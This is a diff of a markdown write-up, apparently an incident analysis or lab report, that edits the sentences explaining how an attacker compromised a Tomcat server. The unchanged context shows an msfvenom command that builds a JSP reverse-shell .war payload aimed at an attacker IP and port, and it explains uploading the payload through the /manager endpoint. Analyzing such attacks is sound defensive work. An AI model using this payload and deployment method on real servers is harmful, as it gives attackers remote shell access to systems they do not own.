@@ -48,7 +48,7 @@
 
 `msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.152.252 LPORT=9001 -f war > reverse.war`
 
-+ The attacker used the following command to build a .war file that will send a reverse connection back to the attacker machine - 
++ The attacker used the following command to build a .war file that will send a reverse connection back to the attacker machine.
 
 
 <br>
@@ -56,7 +56,7 @@
 
 <img width="2540" height="493" alt="image" src="https://github.com/user-attachments/assets/48208138-c1df-4ce7-b188-64a514ca22d1" />
 
-+ This file is then uploaded via the `/manager` endpoint. This will create the `/reverse` endpoint that houses the .war file, which upon navigating to will prompt the webserver to send a connection out to the attacker.
++ This file is then uploaded via the `/manager` endpoint. This will create the `/reverse` endpoint that houses the payload, which upon execution, prompts the webserver to send a connection out to the attacker.
 
 <br>
 <br>
